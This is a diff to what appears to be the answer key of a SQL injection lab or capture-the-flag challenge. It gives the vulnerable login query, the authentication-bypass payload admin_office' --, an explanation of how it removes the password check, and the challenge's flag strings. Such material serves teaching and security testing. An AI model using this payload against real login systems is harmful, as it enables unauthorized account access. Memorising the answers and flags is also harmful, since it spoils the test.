@@ -533,9 +533,11 @@ verification and log in as an administrator. Can you craft a payload to
 authenticate as 'admin_office' without knowing the password?"
 
 Vulnerability Location: /lab7/2/login
-Parameter: Just 'username' (username field in login form)
+Parameter: 'username' (username field in login form)
 Query Template: SELECT * FROM lab7_office_users WHERE username = '{username}' AND password = '{password}'
-Injection Payload: admin_office' -- (comment out password check)
+Injection Payload: admin_office' -- 
+Explanation: The payload closes the username string context with a single quote and uses SQL comment (--) to comment out the password check, resulting in: SELECT * FROM lab7_office_users WHERE username = 'admin_office' --  AND password = '{password}'
+Resulting Query: SELECT * FROM lab7_office_users WHERE username = 'admin_office' (password check ignored)
 Available Flags (Random Selection):
   - FLAG{query_manipulation_nu2}
   - FLAG{database_access_xi2}
